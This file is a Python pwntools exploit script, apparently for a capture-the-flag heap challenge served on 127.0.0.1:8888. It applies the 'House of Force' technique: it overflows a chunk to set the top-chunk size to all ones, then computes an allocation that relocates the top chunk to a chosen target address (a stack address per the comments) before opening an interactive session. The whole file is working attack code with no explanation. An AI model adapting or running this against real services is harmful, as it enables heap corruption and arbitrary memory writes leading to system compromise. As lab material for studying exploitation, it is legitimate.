from pwn import *

context.arch='amd64'

host = '127.0.0.1'
port = 8888
r = remote(host, port)

def allocate_heap(size, data, sendline=True, top=0, top_size=0):
    r.recvuntil(':')
    r.sendline(b'1')
    r.recvuntil(':')
    r.sendline(str(size).encode())
    r.recvuntil(':')
    if sendline:
        r.sendline(data)
    else:
        r.send(data)
    if top != 0:
        change = 0x10 + (size&0xfffffffffffffff0)
        return top + change, top_size - change

def show_heap():
    r.recvuntil(':')
    r.sendline(b'2')

def gen_new_top(addr, old_top, old_top_size):
    nb = (addr - 0x10) - old_top - 0x10
    nb &= 0xfffffffffffffff0
    allocate_heap(nb, b'a')
    # print predicted
    new_top = old_top + (nb + 0x10)
    new_top_size = old_top_size - (nb + 0x10)
    return new_top, new_top_size

# overwrite chunk size
allocate_heap(0x30, b'a')
allocate_heap(0x30, b'a')
allocate_heap(0x38, b'c'*0x38 + p64(0xffffffffffffffff))
r.recvuntil(':')

# stack_addr = int(input('stack_addr: '), 16)
# want_addr = stack_addr - 0x1568
# want_addr = 0x7fff2a850a98
top = int(input('top_chunk : '), 16)
want_addr = int(input('want_addr : '), 16)
print('want_addr =', hex(want_addr))
new_top, new_top_size = gen_new_top(want_addr, top, 0xfffffffffffffff8)
new_top, new_top_size = allocate_heap(0x10, b'a', False, new_top, new_top_size)
print('new_top =', hex(new_top))
print('new_top_size =', hex(new_top_size))

r.interactive()
